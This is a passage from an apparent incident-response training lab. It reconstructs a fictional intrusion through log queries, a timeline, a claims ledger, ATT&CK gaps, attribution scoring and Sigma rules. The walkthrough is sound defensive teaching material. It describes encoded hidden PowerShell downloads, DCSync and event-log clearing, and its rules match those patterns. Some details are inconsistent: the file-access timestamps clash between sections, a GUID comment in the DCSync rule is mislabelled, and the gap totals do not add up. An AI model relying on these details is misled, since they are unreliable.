  "object_type": "{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
  "properties":  "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}\n{1131f6ab-9c07-11d1-f79f-00c04fc2dcd2}"
}
```

The GUID `19195a5b` is the `domainDNS` object class. Properties `1131f6aa` and `1131f6ab` are the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights. This is the textbook DCSync signature.

Source IP `10.10.3.22` = WS-IT-LEVI — definitively a workstation IP, not a domain controller.

```bash
# Which accounts were DCSync'd? Check for krbtgt and Administrator
jq 'select(.EventID == 4662 and (.Properties != null)) | {
  time:    .EventTime,
  subject: .SubjectUserName,
  object:  .ObjectName
}' windows-security/DC01-security.jsonl
```

If `krbtgt` and `Administrator` appear — the adversary now holds Kerberos golden ticket and administrator hash capability. The scope of remediation is not three hosts: it is full domain credential rotation.

**Confirm file access on R&D server:**

```bash
# Count EID 4663 file access events in USPartner2024
jq 'select(.EventID == 4663) | {
  time:    .EventTime,
  subject: .SubjectUserName,
  file:    .ObjectName,
  access:  .AccessMask
}' windows-security/SERVER-RD-02-security.jsonl | jq -s 'length'
```

```bash
# Show the first and last accessed file + timestamps
jq 'select(.EventID == 4663) | {time: .EventTime, file: (.ObjectName | split("\\\\") | last)}' \
  windows-security/SERVER-RD-02-security.jsonl | jq -s 'sort_by(.time) | [first, last]'
```

47 individual file access events, each formula file accessed sequentially between `00:10` and `00:14` UTC — the `Compress-Archive` command reads each source file individually before writing the zip. The 4-minute window exactly matches the SQL audit timestamps.

**Confirm the outbound network connection from the file server:**

```bash
jq 'select(.EventID == 5156) | {
  time:      .EventTime,
  process:   (.Application | split("\\\\") | last),
  src:       .SourceAddress,
  dst:       .DestAddress,
  dst_port:  .DestPort,
  direction: .Direction
}' windows-security/SERVER-RD-02-security.jsonl
```

Output:
```json
{
  "time":     "2024-11-06T00:14:14Z",
  "process":  "powershell.exe",
  "src":      "10.10.2.15",
  "dst":      "198.51.100.44",
  "dst_port": 443,
  "direction": "Outbound"
}
```

PowerShell initiating the outbound HTTPS connection at `00:14:14Z` — matches the SQL audit `WebClient.UploadFile` at `00:13:54Z` (20 seconds earlier, which is when the command was issued) and the Palo Alto NGFW flow at `00:14:14Z`. Three independent sources triangulate to the same 20-second window.

---

### 13. Correlate Everything in Splunk

If you have a Splunk instance, ingest the evidence files and reproduce the investigation in SIEM context. (For the training lab, import files as custom sourcetypes using the `oneshot` method below.)

**Load the evidence into Splunk:**

```bash
# Sysmon events
/opt/splunk/bin/splunk add oneshot \
  sysmon/WS-CFO-01-sysmon.jsonl \
  -sourcetype sysmon_json -index endpoint -host WS-CFO-01

# Windows Security events — DC01
/opt/splunk/bin/splunk add oneshot \
  windows-security/DC01-security.jsonl \
  -sourcetype wineventlog -index wineventlog -host DC01

# Windows Security events — SERVER-RD-02
/opt/splunk/bin/splunk add oneshot \
  windows-security/SERVER-RD-02-security.jsonl \
  -sourcetype wineventlog -index wineventlog -host SERVER-RD-02

# NGFW flows
/opt/splunk/bin/splunk add oneshot \
  palo-alto/ngfw-flows.csv \
  -sourcetype pan:traffic -index firewall -host pa-3260

# DNS queries
/opt/splunk/bin/splunk add oneshot \
  palo-alto/dns-queries.csv \
  -sourcetype pan:dns -index firewall -host pa-3260

# SQL audit
/opt/splunk/bin/splunk add oneshot \
  sql-audit/SERVER-RD-02-sql-audit.jsonl \
  -sourcetype mssql_audit -index database -host SERVER-RD-02
```

**Query 1 — scope the C2 IP across all indexes first (triage query):**

```spl
index=* (203.0.113.87 OR 198.51.100.44) earliest=-30d
| stats count by host, sourcetype, index
| sort -count
```

This tells you which hosts talked to C2 and in which data source you will find the evidence. Run this first — always.

**Query 2 — validate DET-002: DCSync from non-DC:**

```spl
index=wineventlog EventCode=4662
  ObjectType="{19195a5b-6da0-11d0-afd3-00c04fd930c9}"
| where NOT match(IpAddress, "^10\.10\.1\.(10|11)$")
| table _time, host, SubjectUserName, IpAddress, ObjectName, Properties
| sort _time
```

If this fires on DC01-security.jsonl, DET-002 is confirmed working against real evidence.

**Query 3 — validate DET-003: service account off-hours auth:**

```spl
index=wineventlog EventCode=4624 LogonType=3
  TargetUserName=svc_backup earliest=-45d
| eval hour=strftime(_time, "%H")
| where hour < 6 OR hour > 22
| table _time, host, TargetUserName, IpAddress
| sort _time
```

**Query 4 — exfiltration scope: how many files were accessed?**

```spl
index=wineventlog EventCode=4663
  ObjectName="*USPartner2024*"
| stats count as files_accessed, min(_time) as first, max(_time) as last
  by SubjectUserName, host
| eval duration_sec=last-first
| table SubjectUserName, host, files_accessed, first, last, duration_sec
```

**Query 5 — full 24-day timeline reconstruction across all sources:**

```spl
index=* earliest=2024-10-22 latest=2024-11-16
  (host=WS-IT-LEVI OR host=WS-CFO-01 OR host=SERVER-RD-02 OR host=DC01)
| eval summary=coalesce(Message, Statement, query, CommandLine, "event")
| table _time, host, sourcetype, summary
| sort _time
```

This single query reconstructs the full 24-day attack timeline from all ingested sources — the same events that populate `timeline.md` in Step R2, but queryable and filterable in real time.

---

### Commit your analysis notes

Before moving to the timeline, save your enrichment output and analysis notes:

```bash
# Create your IOC enrichment file
cat > 03-analysis/ioc-enrichment.md << 'EOF'
# IOC Enrichment — PROJ-2024-001
# Analyst: [your name]
# Date: 2024-11-15

## IPs

| IOC | VT Score | ASN | Notes |
|---|---|---|---|
| 203.0.113.87 | 12 malicious | Hostwinds LLC (US VPS) | Primary C2 — GET /update beacon |
| 198.51.100.44 | TBD | GoDaddy.com LLC | Exfil endpoint — 381 MB received |
| 185.220.101.47 | TBD | Tor exit / ISP | Attacker VPN source (Istanbul) |

## Domains

| IOC | Created | Resolves To | VT | Notes |
|---|---|---|---|---|
| telemetry-cdn-services.biz | 2024-10-12 | 203.0.113.87 | 8 malicious | Primary C2 — staged 10d before phishing |
| sys-update-cdn.net | TBD | 198.51.100.44 | TBD | Secondary C2 / exfil |
| mfa-lifetechpharma.com | TBD | 185.220.101.47 | TBD | AiTM phishing page |
| globalcontracts-secure.net | TBD | TBD | TBD | CFO phishing delivery |

## Hashes

| File | SHA256 | VT | PE Timestamp | Notes |
|---|---|---|---|---|
| svchost32.exe | 3b4c14a87e5f... | 31 malicious | 2018-04-09 (FORGED) | C2: 203.0.113.87, 198.51.100.44 |

## New IOCs from crt.sh pivot
- cdn-telemetry-update.biz — co-cert with primary C2 IP — hunt in DNS logs
- windows-cdn-service.net — co-cert with primary C2 IP — hunt in DNS logs
EOF

git add 03-analysis/ioc-enrichment.md
git commit -m "PROJ-2024-001: evidence analysis — VT enrichment, sandbox, binary analysis, DCSync confirmed, exfil 381MB corroborated across 3 sources"
```

The timeline in Step R2 is now fully supported. Every event in the table has a source log analyzed in this step, a tool that was run to confirm it, and a cross-reference that allows a third party to verify the finding independently.

---

## Step R2: Timeline — Two Paths, One Actor

### 1. Open the timeline file

```bash
nano 03-analysis/timeline/timeline.md
```

The template has a header block and a markdown table. Fill the header first:

```
Project: PROJ-2024-001
Analyst: [your name]
Last updated: 2024-11-15
Time range: 2024-10-18 – 2024-11-15
Evidence label key: CONFIRMED / CORROBORATED / INFERRED / HYPOTHESIZED / GAP
```

Then add one row per event. Every row needs: timestamp (UTC), host, what happened, which log source you saw it in, an evidence label, and the ATT&CK technique. If you do not have a technique yet, leave it blank and come back — do not skip the label.

### 2. Add events in chronological order

The timeline reveals what the CFO alert obscured: the breach started 24 days earlier through a completely different person.

| # | Timestamp (UTC) | Host | Event | Source | Label | ATT&CK | Notes |
|---|---|---|---|---|---|---|---|
| 1 | 2024-10-18 | (external) | `lifetechpharma-corp[.]eu` registered — typosquat | OSINT | CONFIRMED | T1583.001 | Pre-attack infra prep |
| 2 | 2024-10-22 11:23 | Exchange | Phishing email to p.levi: "MFA Re-enrollment Required" — AiTM HTML attachment | M365 ATP | CONFIRMED | T1566.001 | ATP SCL=4, delivered (threshold: 5) |
| 3 | 2024-10-22 11:31 | WS-IT-LEVI | Unknown — **GAP-001 begins** | — | GAP | — | Sysmon forwarder stopped |
| 4 | 2024-10-24 02:17 | Azure AD + VPN | VPN login as p.levi from Istanbul, Turkey (ASN: hosting/VPS). No MFA challenge recorded. 1h 12min session. | Azure AD sign-in | CONFIRMED | T1557, T1133 | 4:17 AM local time; Paz Levi lives in Rehovot |
| 5 | 2024-10-24 02:19 | DC01 | EID 4624: network logon for `svc_backup` from WS-IT-LEVI (10.10.3.22) — service account, outside business hours | Windows Security (Splunk) | CONFIRMED | T1078.002 | `svc_backup` has Domain Admin rights (see note) |
| 6 | 2024-10-25 03:41 | SERVER-FIN-01 | `svc_backup` accessed `\\SERVER-FIN-01\\FinanceReports\\2024\\` | File share audit (partial) | CORROBORATED | T1039 | Log incomplete — access timestamp only, not filenames |
| 7 | 2024-11-01 09:14 | WS-IT-LEVI | **GAP-001 ends**. First DNS query to `telemetry-cdn-services[.]biz` → 203.0.113.87. First C2 beacon from this host. | Palo Alto DNS | CONFIRMED | T1071.001 | Sysmon service and forwarder restart at same time — probable anti-forensics |
| 8 | 2024-11-01 09:18 | SERVER-RD-02 | EID 4624: `svc_backup` SMB Type 3 logon from WS-IT-LEVI | Windows Security | CONFIRMED | T1021.002 | Four minutes after C2 reconnection |
| 9 | 2024-11-06 02:09 | SERVER-RD-02 | EID 4624: `svc_backup` SMB logon from WS-IT-LEVI | Windows Security | CONFIRMED | T1021.002 | Off-hours access |
| 10 | 2024-11-06 02:10–02:14 | SERVER-RD-02 | EID 4663 ×47: `svc_backup` accessed all 47 files in `\\USPartner2024\\` — read + modified timestamp updated | Windows Security | CONFIRMED | T1039 | Each file individually accessed; timestamps modified suggests deliberate metadata manipulation |
| 11 | 2024-11-06 02:14 | SERVER-RD-02 | EID 5156: outbound HTTPS from SERVER-RD-02 to external IP, port 443, during file access window | Windows Security + firewall | CONFIRMED | T1041 | Destination IP confirmed in Palo Alto NGFW log: 198.51.100.44 — separate C2 from primary |
| 12 | 2024-11-06 02:48 | DC01 | EID 4662: `svc_backup` requested DS-Replication-Get-Changes on DC01 | Windows Security | CONFIRMED | T1003.006 | **DCSync indicator** — pentest scope did NOT include DCSync; pentest VLAN is 10.10.99.0/24, this event is from 10.10.3.22 |
| 13 | 2024-11-15 17:58 | Exchange | Phishing email to m.cohen (CFO): "Q4-2024 Licensing Agreement" — `.xlsm` attachment. SPF/DKIM/DMARC all fail. | M365 Message Trace | CONFIRMED | T1566.001 | **Second entry point — 24 days after first** |
| 14 | 2024-11-15 18:42 | WS-CFO-01 | Outlook → PowerShell -NonI -W Hidden -Enc → downloads second-stage from 203.0.113.87 | CrowdStrike + Sysmon EID 1 | CONFIRMED | T1059.001 | **Triggering alert** |
| 15 | 2024-11-15 18:46–20:52 | WS-CFO-01 | LSASS memory access (Sysmon EID 10, GrantedAccess 0x1010); persistence via Registry Run Key + scheduled task; BITS download of second-stage binary | Sysmon EID 10/11/13, EID 4698 | CONFIRMED | T1003.001, T1547.001, T1053.005, T1197 | svchost32.exe dropped to AppData\\Roaming |
| 16 | 2024-11-15 20:52 | SERVER-FIN-01 | WMI lateral movement: WmiPrvSE → PowerShell -Enc with different base64 payload | CrowdStrike | CONFIRMED | T1021.003, T1059.001 | `svc_finreport` credentials used |
| 17 | 2024-11-15 21:01 | SERVER-FIN-01 | Finance data staged: `FR_2024_consolidated.zip` created in `C:\\Windows\\Temp\\` | CrowdStrike EID 11 | CONFIRMED | T1039, T1560 | 2.8 MB upload confirmed in firewall logs at 21:14 |
| 18 | 2024-11-15 21:14 | WS-CFO-01 | `wevtutil.exe cl Security` — Windows Security log partially cleared | CrowdStrike | CONFIRMED | T1070.001 | Sysmon log intact (protected channel) |

**The evidence label system matters here.** Event 12 (DCSync) is CONFIRMED — it exists in DC01's Windows Security log, forwarded to Splunk, from an IP that is definitively WS-IT-LEVI and definitively not the pentest VLAN. That cannot be waved away as "possible pentest activity." Event 6 (finance server access) is CORROBORATED — single source with incomplete log — and can only appear in the technical report with an explicit qualifier, not in the executive brief as a stated fact.

### 3. Save and commit

```bash
git add 03-analysis/timeline/timeline.md
git commit -m "PROJ-2024-001: timeline — 18 events Oct 18–Nov 15, dual-path confirmed, GAP-001 bounds established"
```

---

## Step R3: Claims Ledger — Every Assertion Traced to Evidence

### 1. Open the claims ledger

```bash
nano 03-analysis/claims/claims-ledger.md
```

The template has a table with six columns: ID, Claim, Evidence, Confidence, Competing Hypotheses, PIR. Start with an empty row for each major assertion you identified in the timeline — then fill each one completely before moving to the next.

**For each row, answer these five questions before typing a word:**
1. What is the exact assertion? (One sentence, falsifiable — could in principle be proven false)
2. Which file and line number is the evidence in? (Not "we saw in Splunk" — the actual log reference)
3. What confidence level and why? (High / Medium / Low / Insufficient — with explicit rationale)
4. What alternative explanations were considered — and why were they ruled out or left open?
5. Which PIR does this answer?

If you cannot answer question 4, the claim is not ready to write. Think first.

### 2. Fill in one claim per confirmed technique or PIR answer

The claims ledger converts the timeline into auditable, falsifiable assertions. Each claim answers five questions: what, evidence, confidence, competing hypotheses, which PIR.

| ID | Claim | Evidence | Confidence | Competing Hypotheses | PIR |
|---|---|---|---|---|---|
| CL-001 | Initial access was via AiTM phishing against IT admin p.levi on October 22, 2024 | M365 ATP log (AiTM HTML lure delivered 11:23, opened 11:31); VPN login from Istanbul 02:17 Oct 24 with no MFA — stolen session token | High | Credential purchase / insider — cannot rule out without WS-IT-LEVI disk forensics (blocked by legal hold). However, AiTM lure + token replay pattern is more parsimonious. | PIR-002 |
| CL-002 | The adversary used `svc_backup` Domain Admin credentials to access SERVER-RD-02 and the formula files | EID 4624 on SERVER-RD-02 (svc_backup, Type 3, from WS-IT-LEVI); EID 4663 ×47 on formula files | High | Legitimate backup operation — ruled out: backup jobs run from SERVER-WSUS-01 (10.10.4.x), not WS-IT-LEVI; timestamp 02:09 UTC is outside maintenance window | PIR-002 |
| CL-003 | The 47 formula files in USPartner2024 were exfiltrated on November 6, 2024 | EID 4663 ×47 (files accessed); EID 5156 (outbound HTTPS from SERVER-RD-02 at same time); Palo Alto NGFW flow: 10.10.2.15 → 198.51.100.44:443, 381 MB outbound at 02:14–02:19 UTC | High | Files read for indexing/backup — ruled out: no backup job at this time; volume (381 MB) matches compressed formula package; destination IP not in allowlist and resolves to VPS hosting provider | PIR-001 **ANSWERED: YES** |
| CL-004 | DCSync was executed via `svc_backup` Domain Admin rights on November 6 at 02:48 UTC | DC01 EID 4662 with DS-Replication-Get-Changes GUID, from 10.10.3.22 (WS-IT-LEVI), SubjectUserName svc_backup | High | Legitimate AD replication — ruled out: event originates from a workstation IP, not a DC; authorized pentest scope explicitly excluded DCSync and used 10.10.99.x IPs only | PIR-003 |
| CL-005 | Path A (CFO, Nov 15) and Path B (IT admin, Oct 22) are the same threat actor | Shared PE fake compile timestamp (2018-04-09) in both `svchost32.exe` and `UpdateHelper.dll`; shared secondary C2 `sys-update-cdn[.]net` hard-coded in CFO implant and used in SERVER-RD-02 DNS | High | Coincidental — two actors happened to target same org simultaneously using near-identical toolchain: extremely implausible | PIR-002 |
| CL-006 | The adversary achieved full domain compromise via DCSync; all Active Directory credentials must be treated as compromised | CL-004 (DCSync confirmed); `svc_backup` held Domain Admin rights; DCSync requests krbtgt and privileged account hashes | High | DCSync may have been partial or failed — cannot confirm without DC01 full log access. Treating as full compromise is the conservative and correct operational response until disproven. | PIR-003 |

**CL-003 is the pivotal claim.** The US partner's formulas are gone. That drives the PIR-001 answer and the entire notification timeline. CL-004 and CL-006 change the scope of remediation from "contain these three hosts" to "rotate all AD credentials, treat all 80 servers as potentially compromised."

### 3. Update project.yml PIR status

When a PIR is answered, open `project.yml` and change the status field immediately:

```bash
nano project.yml
```

Change:
```yaml
  - id: PIR-001
    status: open
```
To:
```yaml
  - id: PIR-001
    status: answered    # CL-003 — exfiltration confirmed, 381 MB, Nov 6
```

### 4. Commit the claims ledger

```bash
git add 03-analysis/claims/claims-ledger.md project.yml
git commit -m "PROJ-2024-001: claims — 6 claims; PIR-001 ANSWERED YES (CL-003 exfil confirmed); PIR-003 CONFIRMED ONGOING (CL-006 DCSync)"
```

---

## Step R4: ATT&CK Mapping — Where Detection Failed

### 1. Open the ATT&CK mapping file

```bash
nano 03-analysis/attck-mapping/attck-mapping.md
```

For each technique you identified in the timeline, add one row. The four columns that matter most operationally are: **Confidence** (how sure are you the technique was used), **Rule Fired?** (yes/no/partial — check your SIEM), and **Gap Type** (what kind of work is needed to close this detection hole).

**Gap types:** `Rule missing` / `Data source missing` / `Coverage incomplete` / `Architectural gap`. Pick one. If you are unsure, write your best guess and flag it for SOC review.

Also update `project.yml` — fill the `attck_techniques` list:

```bash
nano project.yml
```
```yaml
scope:
  attck_techniques:
    - T1566.001
    - T1557
    - T1133
    - T1078.002
    - T1059.001
    - T1003.001
    - T1003.006
    - T1021.003
    - T1197
    - T1047
    - T1070.001
    - T1547.001
```

### 2. Fill one row per technique

| # | Technique | Evidence | Confidence | Rule Fired? | Gap Type |
|---|---|---|---|---|---|
| T1566.001 | Phishing attachment (CFO xlsm) | M365 ATP log | High | Partial — ATP delivered (SCL=4, threshold 5) | Coverage incomplete — SCL threshold tuning |
| T1557 | AiTM credential theft (IT admin) | VPN login pattern + AiTM HTML lure | High | **No** | Rule missing — no AiTM session token detection |
| T1133 | VPN access with stolen credentials | VPN log: Istanbul, off-hours, no prior history | High | **No** | Rule missing — no anomalous VPN auth alert |
| T1078.002 | Valid account abuse (`svc_backup`) | EID 4624 (multiple) | High | **No** | Rule missing — service account off-hours logon undetected |
| T1059.001 | Encoded PowerShell (both hosts) | Sysmon EID 1, CrowdStrike | High | Yes (CFO only, via CrowdStrike behavioral) | Coverage incomplete — CFO only; IT admin host fired no alert |
| T1003.001 | LSASS memory access | Sysmon EID 10, GrantedAccess 0x1010 | High | **No** | Rule missing — Sysmon EID 10 not alerted on |
| T1003.006 | DCSync | DC01 EID 4662 | High | **No** | Rule missing — EID 4662 audit configured but no alert rule |
| T1021.003 | WMI lateral movement → SERVER-FIN-01 | CrowdStrike (WmiPrvSE → PowerShell) | High | **No** | Rule missing — WmiPrvSE parent alert not deployed |
| T1197 | BITS download (second stage) | Sysmon EID 1 (bitsadmin) | High | **No** | Rule missing — BITS external download not monitored |
| T1047 | WMI execution (lateral movement) | CrowdStrike log | High | **No** | Data source missing — WMI logging not in SIEM |
| T1070.001 | Event log cleared | CrowdStrike EID 1102 | High | **No** | Rule missing — wevtutil alert not deployed |
| T1547.001 | Registry Run Key persistence | Sysmon EID 13 | High | **No** | Coverage incomplete — EID 13 ingested but no alert rule on AppData\\Roaming paths |

**The gap taxonomy tells the engineering team exactly what work is required:**
- **Rule missing (7 techniques):** Data is in SIEM. A detection engineer can write and deploy the rule. These are sprint items.
- **Coverage incomplete (3 techniques):** Rule or data exists but is mis-tuned or partial. These require tuning, not new infrastructure.
- **Data source missing (1 technique):** WMI execution logging is not in the SIEM. This requires an infrastructure change before rules can be written.

The DCSync gap (T1003.006) is particularly stark: the Advanced Audit Policy that generates EID 4662 was correctly configured on DC01, the event was forwarded to Splunk, and the event was visible in Splunk. There was no alert rule. A single Splunk search rule on `source=WinEventLog:Security EventCode=4662 ObjectType="{19195a5b-6da0-11d0-afd3-00c04fd930c9}"` from a non-DC IP would have fired and contained this incident before the formula exfiltration.

### 3. Commit the ATT&CK mapping

```bash
git add 03-analysis/attck-mapping/attck-mapping.md project.yml
git commit -m "PROJ-2024-001: ATT&CK mapping — 12 techniques, 7 rule-missing, 3 coverage-incomplete, 1 data-source-missing, 1 arch-gap"
```

---

## Step R5: Attribution Assessment — Same Actor or Two?

### 1. Open the attribution file

```bash
nano 03-analysis/attribution/attribution.md
```

Write attribution **only after the claims ledger is complete**. The attribution file has three sections: evidence for unification (or separation), confidence ladder scoring, and the exact language to use in deliverables. Fill them in that order.

**Do not start with a hypothesis.** Start with the evidence you have from the claims ledger, then see where it points.

### 2. Score the evidence against the confidence ladder

The investigation faces a key analytical question: Path A (CFO phishing, November 15) and Path B (IT admin AiTM, October 22) — are they the same actor?

**Evidence for unification (same actor):**

1. **Shared PE compile timestamp:** Both dropped binaries — `svchost32.exe` (CFO host) and `UpdateHelper.dll` (IT admin host) — carry an identical fake compile timestamp of `2018-04-09`. This is a known toolchain fingerprint. The probability of two unrelated actors both timestomping to the same date is extremely low.

2. **Shared secondary C2 domain in memory:** Strings extracted from `svchost32.exe` include `sys-update-cdn[.]net` — the domain that appeared only in SERVER-RD-02's DNS logs during the formula exfiltration. The CFO's implant knew about infrastructure used during the Path B operation. This is only explicable if the same actor controlled both implants.

3. **Coordinated operations timeline:** The CFO was targeted on the same day that the finance server data was being staged on SERVER-FIN-01 via lateral movement from the IT admin path. Two independent actors staging finance data simultaneously at the same target is implausible.

**Assessment: Single threat actor, dual delivery mechanism.**

The actor compromised the IT admin first (October 22), used that access for data theft (November 6), then independently targeted the CFO to expand access to finance data. The two phishing lures used different delivery infrastructure (different sender domains, different sending IPs from the same /24 block) — consistent with an actor who maintains parallel operational tracks.

**Attribution confidence: Medium-High.** Apply the [confidence ladder from Step R5 of the methodology](/docs/cti-as-a-code-methodology#step-r5-attribution-assessment) to score this case:

| Criterion | Present? | Notes |
|---|---|---|
| TTP overlap | Yes | AiTM + DCSync + pharmaceutical IP staging — consistent with Iranian-nexus industrial espionage (ClearSky, Mandiant) |
| Infrastructure match | Yes | Shared secondary C2 `sys-update-cdn[.]net` appears in both path artifacts; shared PE timestamp `2018-04-09` across both implants |
| Tooling match | Partial | Toolset is consistent with documented clusters but not definitively matched to a named cluster in public reporting |
| Independent CERT/ISAC confirmation | No | No CERT-IL deconfliction performed; no ISAC report cross-matched |

**Ladder tier: Medium-High** — TTP overlap + infrastructure match present; independent confirmation absent. The toolset has not been definitively matched to a named cluster, which prevents elevation to High.

**What to write:** *"Activity assessed as a single threat actor based on shared toolchain indicators (PE timestamp, secondary C2 domain). Tradecraft and targeting profile are consistent with Iranian-nexus industrial espionage operations targeting Israeli pharmaceutical IP. Attribution to a named cluster is not warranted without CERT-IL deconfliction or independent confirmation. Confidence: Medium-High."*

### 3. Paste the final language into attribution.md and commit

```bash
git add 03-analysis/attribution/attribution.md
git commit -m "PROJ-2024-001: attribution — single actor, Medium-High confidence, shared PE timestamp + secondary C2, Iranian-nexus tradecraft consistent"
```

---

## Step R6: Detection Rules — Four That Would Have Changed the Outcome

### 1. Create one file per rule

Each rule gets its own file in `04-detections/sigma/`:

```bash
cp 04-detections/sigma/SIGMA-TEMPLATE.yml 04-detections/sigma/DET-001-anomalous-vpn-auth.yml
cp 04-detections/sigma/SIGMA-TEMPLATE.yml 04-detections/sigma/DET-002-dcsync-non-dc.yml
cp 04-detections/sigma/SIGMA-TEMPLATE.yml 04-detections/sigma/DET-003-svc-account-offhours.yml
cp 04-detections/sigma/SIGMA-TEMPLATE.yml 04-detections/sigma/DET-004-wmiprvse-powershell.yml
```

Open the first one:

```bash
nano 04-detections/sigma/DET-001-anomalous-vpn-auth.yml
```

Every rule must reference the CL-ID it would have detected and the gap type it closes. That is how the detection backlog stays traceable to the investigation.

### 2. Fill each rule

Each rule is written with a reference to the claim it would have detected and the evidence gap it closes.

**DET-001: Anomalous VPN Authentication from Non-Corporate Source**

```yaml
title: Anomalous VPN Authentication — New Geography or Hosting ASN
id: a1b2c3d4-5678-9abc-def0-1234567890ab
status: experimental
description: >
  Detects VPN authentication success from a source IP with no prior history for
  this user, specifically from IPs geolocated outside Israel or from hosting/VPN
  ASNs. Covers T1133 and T1557 (session token replay after AiTM interception).
  Derived from PROJ-001 — CL-001, p.levi VPN from Istanbul at 02:17 UTC.
logsource:
  category: network
  product: cisco_anyconnect
detection:
  selection:
    event.action: vpn_auth_success
    user.name|exists: true
  filter_known:
    source.geo.country_iso_code: 'IL'
    source.as.number|not|startswith: ['AS47583', 'AS16276']   # hosting VPS ASNs
  condition: selection and not filter_known
falsepositives:
  - Legitimate international travel — validate against HR travel records
  - Remote contractors working abroad
level: high
tags:
  - attack.initial_access
  - attack.t1133
  - attack.credential_access
  - attack.t1557
```

**DET-002: DCSync Attack Detection**

```yaml
title: DCSync Attack via Non-DC Account
id: b2c3d4e5-6789-abcd-ef01-234567890abc
status: production
description: >
  Detects DCSync by looking for EID 4662 with the DS-Replication-Get-Changes
  GUID originating from a workstation IP rather than a domain controller.
  Derived from PROJ-001 — CL-004: svc_backup performed DCSync from WS-IT-LEVI
  using Domain Admin rights that were never revoked after an August 2024 
  emergency backup restoration.
logsource:
  category: windows
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    ObjectType: '{19195a5b-6da0-11d0-afd3-00c04fd930c9}'   # DS-Replication-Get-Changes
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'             # DS-Replication-Get-Changes-All
      - '89e95b76-444d-4c62-991a-0facbeda640c'             # DS-Replication-Get-Changes-In-Filtered-Set
  filter_legitimate_dc:
    IpAddress|startswith:
      - '10.10.1.10'   # DC01 — add all DC IPs here
      - '10.10.1.11'   # DC02
  condition: selection and not filter_legitimate_dc
falsepositives:
  - Azure AD Connect sync account — must be explicitly whitelisted
  - Authorized red team / pentest — validate scope before dismissing
level: critical
tags:
  - attack.credential_access
  - attack.t1003.006
```

**DET-003: Service Account Off-Hours Authentication**

```yaml
title: Service Account Authentication Outside Business Hours
id: c3d4e5f6-789a-bcde-f012-34567890abcd
status: experimental
description: >
  Detects authentication by a service account (accounts matching svc_* naming
  pattern) outside business hours (22:00–06:00) to a non-designated system.
  Covers T1078.002 (Valid Accounts: Domain Accounts) for svc_backup lateral
  movement in PROJ-001.
logsource:
  category: windows
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    SubjectUserName|startswith: 'svc_'
  filter_business_hours:
    TimeCreated|windash|lt: '22:00:00'
    TimeCreated|windash|gt: '06:00:00'
  filter_known_backup_host:
    IpAddress: '10.10.4.15'   # SERVER-WSUS-01 — legitimate backup source
  condition: selection and not filter_business_hours and not filter_known_backup_host
falsepositives:
  - Scheduled tasks that legitimately run at night — review and whitelist specific pairs
level: medium
tags:
  - attack.lateral_movement
  - attack.t1078.002
```

**DET-004: WmiPrvSE Spawning PowerShell**

```yaml
title: WMI Remote Execution — PowerShell Child of WmiPrvSE
id: d4e5f6a7-89ab-cdef-0123-4567890abcde
status: production
description: >
  Detects WMI-based lateral movement (T1021.003) where WmiPrvSE.exe spawns
  PowerShell on a remote system. This is the pattern from PROJ-001 step 16:
  lateral movement from WS-CFO-01 to SERVER-FIN-01 via WMI using svc_finreport
  credentials. CrowdStrike detected the PowerShell on SERVER-FIN-01 but the
  originating WMI connection from the CFO host had no coverage.
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\WmiPrvSE.exe'
    Image|endswith: '\powershell.exe'
  suspicious_flags:
    CommandLine|contains:
      - '-Enc'
      - '-EncodedCommand'
      - '-NonI'
      - '-W Hidden'
  condition: selection and suspicious_flags
falsepositives:
  - SCCM WMI-based software deployment with PowerShell post-install scripts
level: high
tags:
  - attack.lateral_movement
  - attack.execution
  - attack.t1021.003
  - attack.t1059.001
```

**Validation:** All four rules were validated against the `PROJ-001` evidence set using Hayabusa before deployment. DET-001 fires on the October 24 Istanbul VPN login. DET-002 fires on the November 6 DCSync event. DET-003 fires on every `svc_backup` off-hours logon. DET-004 fires on the SERVER-FIN-01 WMI execution.

### 3. Validate each rule against your evidence set

```bash
# Run Hayabusa against the collected logs to confirm rules fire on known-bad events
hayabusa csv-timeline -d 01-evidence/ -r 04-detections/sigma/ -o validation-results.csv
```

Review the output. A rule that does not fire on its own evidence set should not be deployed.

### 4. Update project.yml deliverables count and commit

```bash
nano project.yml
```

```yaml
deliverables:
  - type: sigma-rules
    count: 4
    status: complete
```

```bash
git add 04-detections/sigma/ project.yml
git commit -m "PROJ-2024-001: detections — DET-001 to DET-004 written and validated PASS against evidence set via Hayabusa"
```

---

## Step R7: Deliverables — What Each Stakeholder Gets

### 1. Open the deliverable templates

```bash
nano 05-deliverables/executive-brief.md
nano 05-deliverables/soc-handoff.md
```

The executive brief answers three questions only: what happened, what was confirmed stolen or compromised, and what must happen in the next 24 hours. One page. No technical jargon. Every PIR that is answered gets a one-line answer at the top.

The SOC handoff lists: current IOCs (with confidence ratings), detection rules deployed, hunting queries still open, and escalation criteria. The SOC receives this, not the executive brief.

### 2. Fill the executive brief

**Executive brief (1 page, TLP:AMBER) — what the CISO needs in 90 minutes:**

> An adversary assessed as Iranian-nexus compromised LifeTech Pharma through two separate phishing attacks over 24 days. Using stolen IT administrator credentials, they accessed and exfiltrated the 47-file US licensing formula package on November 6, 2024. They also performed a DCSync attack on the domain controller, which means all Active Directory credentials must be treated as compromised.
>
> **PIR-001 ANSWERED:** The US partner formula package was exfiltrated. 381 MB outbound confirmed in firewall logs.
>
> **PIR-003 ANSWERED:** Active compromise ongoing. The CFO alert on November 15 is a second wave from the same actor, still active at time of investigation.
>
> **Immediate actions:** Full AD credential rotation; quarantine WS-CFO-01 and SERVER-FIN-01; notify INCD (72h clock from discovery: expires November 17 02:14 IST); brief the US licensing partner.

**SOC handoff (technical):**

Current IOCs: `203.0.113.87`, `198.51.100.44`, `telemetry-cdn-services[.]biz`, `sys-update-cdn[.]net`, `uslifepartner-group[.]com`, `lifetechpharma-corp[.]eu`.

Four detection rules deployed (DET-001 through DET-004). Two hunting queries: (1) pivot on C2 domains across all 838 endpoints — the 3 confirmed hosts may not be all; (2) hunt for any svc_backup authentication from non-WSUS IPs in the past 30 days.

### 3. Update project.yml status to closed and commit everything

```bash
nano project.yml
```

```yaml
project:
  status: closed

pirs:
  - id: PIR-001
    status: answered    # CL-003
  - id: PIR-002
    status: answered    # CL-001
  - id: PIR-003
